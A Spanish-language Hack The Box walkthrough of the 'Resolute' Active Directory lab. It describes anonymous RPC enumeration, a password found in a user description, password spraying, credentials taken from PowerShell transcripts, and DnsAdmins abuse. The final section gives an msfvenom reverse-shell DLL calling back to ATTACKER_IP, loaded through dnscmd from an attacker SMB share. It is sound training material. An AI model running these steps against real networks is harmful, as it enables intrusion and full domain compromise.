---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Medium
  - AD
  - SensitiveInformationDisclosure
  - PasswordSpraying
  - CredentialDiscovery
  - AbusingDnsAdminsGroup
  - DLL
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#System Enumeration|System Enumeration]]
	- [[#Enumeration#Port Enumeration|Port Enumeration]]
	- [[#Enumeration#Active Directory Enumeration|Active Directory Enumeration]]
		- [[#Active Directory Enumeration#Users Validation|Users Validation]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#Information Disclosure via User Description|Information Disclosure via User Description]]
		- [[#Information Disclosure via User Description#User Validation|User Validation]]
		- [[#Information Disclosure via User Description#Password Spraying|Password Spraying]]
- [[#Lateral Movement|Lateral Movement]]
	- [[#Lateral Movement#Credential Discovery in PowerShell Transcripts|Credential Discovery in PowerShell Transcripts]]
		- [[#Credential Discovery in PowerShell Transcripts#Credential Validation|Credential Validation]]
- [[#Privilege Escalation|Privilege Escalation]]
	- [[#Privilege Escalation#Abusing DnsAdmins Group - dnscmd|Abusing DnsAdmins Group - dnscmd]]
		- [[#Abusing DnsAdmins Group - dnscmd#DnsAdmins Group Enumeration|DnsAdmins Group Enumeration]]
		- [[#Abusing DnsAdmins Group - dnscmd#Creating a malicious DLL and Injecting it into the DNS Service|Creating a malicious DLL and Injecting it into the DNS Service]]

---
# Resolute

![](Screenshots/Pasted%20image%2020260601113144.png)

>Máquina de Hack The Box llamada **[Resolute](https://app.hackthebox.com/machines/Resolute)**, centrada en un entorno **Active Directory** donde una mala gestión de información sensible permite obtener credenciales válidas mediante enumeración anónima.
>Tras acceder al sistema a través de **WinRM**, se descubren credenciales expuestas en registros de PowerShell, facilitando movimiento lateral hacia un usuario privilegiado. 
>Finalmente, se abusa de los privilegios del grupo **DnsAdmins** para cargar una DLL maliciosa en el servicio DNS y obtener acceso como **NT AUTHORITY\SYSTEM**.

---
## Enumeration
### System Enumeration

```PowerShell
ping -c 1 10.129.96.155
PING 10.129.96.155 (10.129.96.155) 56(84) bytes of data.
64 bytes from 10.129.96.155: icmp_seq=1 ttl=127 time=40.7 ms

--- 10.129.96.155 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 40.748/40.748/40.748/0.000 ms
```

El `TTL=127` es característico de sistemas Windows (normalmente 128 - 1 salto), lo que nos permite saber el sistema operativo.
### Port Enumeration

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.96.155 -oG allPorts
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49710/tcp open  unknown          syn-ack ttl 127
49737/tcp open  unknown          syn-ack ttl 127
```

```PowerShell
PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-01 09:43:17Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   msrpc        Microsoft Windows RPC
49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc        Microsoft Windows RPC
49686/tcp open   msrpc        Microsoft Windows RPC
49710/tcp open   msrpc        Microsoft Windows RPC
49737/tcp closed unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-06-01T09:44:06
|_  start_date: 2026-06-01T09:36:28
|_clock-skew: mean: 2h27m00s, deviation: 4h02m32s, median: 6m58s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2026-06-01T02:44:10-07:00
```

```PowerShell
crackmapexec smb 10.129.96.155 
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
```

Se añade al archivo `/etc/hosts` el dominio: `10.129.96.155 megabank.local RESOLUTE.megabank.local`.
### Active Directory Enumeration

Se enumera los archivos compartidos.

```PowerShell
smbmap -H 10.129.96.155
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.129.96.155, no fun for you...                                                                        
[*] Closed 1 connections 

smbmap -H 10.129.96.155 -u " "
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.129.96.155, no fun for you...                                                                        
[*] Closed 1 connections

smbclient -L 10.129.96.155 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.96.155 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

No se consigue enumerar nada, se prueba con usuarios y dominios.

```PowerShell
rpcclient -U "" -N 10.129.96.155
pcclient $> querydominfo
Domain:         MEGABANK
Server:
Comment:
Total Users:    79
Total Groups:   0
Total Aliases:  0
Sequence No:    1
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]

rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```

Se enumeran usuarios, grupos y descripciones de usuarios del dominio.

Se observa que el único usuario del dominio con permisos de *Administrador* es `Administrator`.

Se procesan los resultados para obtener listas limpias:

```PowerShell
cat users | awk -F'[][]' '{print $2}' | sponge users
cat groups | awk -F'[][]' '{print $2}' | sponge groups
```

Se comprueban los usuarios son válidos.
#### Users Validation

```PowerShell
kerbrute userenum --dc 10.129.96.155 -d megabank.local users
2026/06/01 11:54:13 >  [+] VALID USERNAME:       ryan@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       abigail@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       sunita@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       Administrator@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       marko@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       marcus@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       sally@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       felicia@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       stevie@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       angela@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       gustavo@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       ulf@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       fred@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       annette@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       steve@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       claire@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       paulo@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       melanie@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       per@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       annika@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       zach@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       simon@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       claude@megabank.local
2026/06/01 11:54:13 >  [+] VALID USERNAME:       naoki@megabank.local
2026/06/01 11:54:13 >  Done! Tested 27 usernames (24 valid) in 0.129 seconds
```

---
## Exploitation
### Information Disclosure via User Description

Al listar la información detallada de los usuarios, se encuentra con las credenciales: `marko:Welcome123!`.
#### User Validation

```PowerShell
crackmapexec smb 10.129.96.155 -u 'marko' -p 'Welcome123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
```

Las credenciales no son válidas para el usuario `marko`, por lo que se considera que la contraseña encontrada fue modificada posteriormente.
#### Password Spraying

Dado que la contraseña encontrada parece seguir una política corporativa común, se prueba su reutilización sobre el resto de usuarios válidos del dominio.

```PowerShell
crackmapexec smb 10.129.96.155 -u users -p 'Welcome123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

Se compruebas las credenciales para **SMB** y **WinRM**.

```PowerShell
crackmapexec smb 10.129.96.155 -u 'melanie' -p 'Welcome123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!

crackmapexec winrm 10.129.96.155 -u 'melanie' -p 'Welcome123!'
SMB         10.129.96.155   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.129.96.155   5985   RESOLUTE         [*] http://10.129.96.155:5985/wsman
WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

Nos podemos conectar al protocolo **WinRM**.

```PowerShell
evil-winrm -i 10.129.96.155 -u 'melanie' -p 'Welcome123!'
```

La flag de `usuario` se encuentra en: `C:\Users\melanie\Desktop`.

---
## Lateral Movement
### Credential Discovery in PowerShell Transcripts

```PowerShell
dir -Force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-         6/1/2026  11:04 PM      402653184 pagefile.sys

cd PSTranscripts
dir -Force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203

cd 20191203
dir -Force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

Se obtienen las credenciales: `ryan:Serv3r4Admin4cc123!`.
#### Credential Validation

Se valida las credenciales del usuario en los protocolos `SMB` y `WinRM`.

```PowerShell
crackmapexec smb 10.129.96.155 -u 'ryan' -p 'Serv3r4Admin4cc123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)

crackmapexec winrm 10.129.96.155 -u 'ryan' -p 'Serv3r4Admin4cc123!'
SMB         10.129.96.155   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.129.96.155   5985   RESOLUTE         [*] http://10.129.96.155:5985/wsman
WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```

---
## Privilege Escalation
### Abusing DnsAdmins Group - dnscmd
####  DnsAdmins Group Enumeration

```PowerShell
net user ryan
User name                    ryan
Full Name                    Ryan Bertrand
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2026 11:46:02 PM
Password expires             Never
Password changeable          6/2/2026 11:46:02 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Contractors
The command completed successfully.

whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

El usuario `ryan` forma parte del grupo `DnsAdmins`.

```PowerShell
net localgroup DnsAdmins
Alias name     DnsAdmins
Comment        DNS Administrators Group

Members

-------------------------------------------------------------------------------
Contractors
The command completed successfully.
```

Al ser del grupo `Contractors`, tiene acceso al grupo local  `DnsAdmins`.

Los miembros del grupo DnsAdmins pueden configurar complementos (ServerLevelPluginDll) que son cargados por el servicio DNS ejecutado como SYSTEM. Esto permite forzar la carga de una DLL arbitraria y obtener ejecución de código con privilegios elevados.
#### Creating a malicious DLL and Injecting it into the DNS Service

[LOLBAS - /dnscmd.exe](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/).

Máquina atacante:

```PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=443 -f dll -o pwned.dll
sudo smbserver.py smbFolder $(pwd) -smb2support | sudo impacket-smbserver smbFolder "$(pwd)" -smb2support
nc -nlvp 443
```

Máquina victima:

```PowerShell
dnscmd.exe /config /serverlevelplugindll \\[ATTACKER_IP]\smbFolder\pwned.dll
sc.exe stop dns
sc.exe start dns
# Si ves que no funciona, vuelve a repetir el proceso.
```

Se obtiene una consola con `nt authority\system`.

La flag de `root` se encuentra en `C:\Users\Administrator\Desktop`.

---